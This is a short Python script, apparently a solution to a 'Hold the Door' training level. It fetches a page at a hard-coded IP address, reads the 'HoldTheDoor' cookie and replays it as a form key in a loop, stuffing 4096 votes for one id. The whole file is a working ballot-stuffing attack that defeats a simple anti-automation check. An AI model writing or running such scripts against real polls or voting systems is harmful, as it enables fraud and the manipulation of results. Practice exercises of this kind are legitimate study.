#!/usr/bin/python3
import requests

r = requests.get("http://158.69.76.135/level1.php")


id = 1586
num_votes = 4096
url = "http://158.69.76.135/level1.php"


for i in range(num_votes):
    cook = r.cookies["HoldTheDoor"]
    response = requests.post(url, data={
                             'id': id, 'holdthedoor': 'submit', 'key': cook},
                             cookies={"HoldTheDoor": cook})

print("Done!")
